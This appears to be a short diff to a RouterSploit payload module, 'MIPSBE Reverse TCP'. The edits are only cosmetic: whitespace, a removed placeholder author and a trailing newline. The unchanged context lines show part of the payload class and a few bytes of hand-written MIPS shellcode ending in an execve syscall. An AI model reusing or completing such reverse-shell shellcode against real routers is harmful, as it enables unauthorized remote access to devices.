@@ -4,13 +4,13 @@ from routersploit import (
     validators,
 )
 
+
 class Exploit(payloads.Payload):
     __info__ = {
         'name': 'MIPSBE Reverse TCP',
         'authors': [
-			'Test',
         ],
-        'description': '', 
+        'description': '',
         'references': [
         ],
     }
@@ -74,4 +74,3 @@ class Exploit(payloads.Payload):
             "\x24\x02\x0f\xab" +            # li       v0,4011
             "\x00\x90\x93\x4c"              # syscall  0x2424d
         )
-
